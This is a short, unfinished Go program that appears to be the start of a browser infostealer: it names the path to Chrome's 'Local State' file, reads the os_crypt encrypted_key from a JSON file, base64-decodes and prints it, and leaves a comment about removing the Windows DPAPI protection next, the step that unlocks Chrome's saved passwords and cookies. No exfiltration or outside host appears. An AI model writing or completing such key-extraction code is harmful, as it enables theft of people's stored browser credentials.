package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
)

func hErr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	get_enc_key()
}

type enc struct {
	OsCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

func get_enc_key() {
	ch_f := "%USERPROFILE%\\Appdata\\Local\\Google\\Chrome\\User Data\\Local State"
	fmt.Println(ch_f)

	//read, parse, and b64
	content, err := ioutil.ReadFile("./n")
	hErr(err)
	var data enc
	json.Unmarshal(content, &data)

	ekey := data.OsCrypt.EncryptedKey
	fmt.Println(ekey)
	dceky, err := base64.StdEncoding.DecodeString(ekey)
	hErr(err)
	fmt.Println(string(dceky))

	//remove win data protection api

}
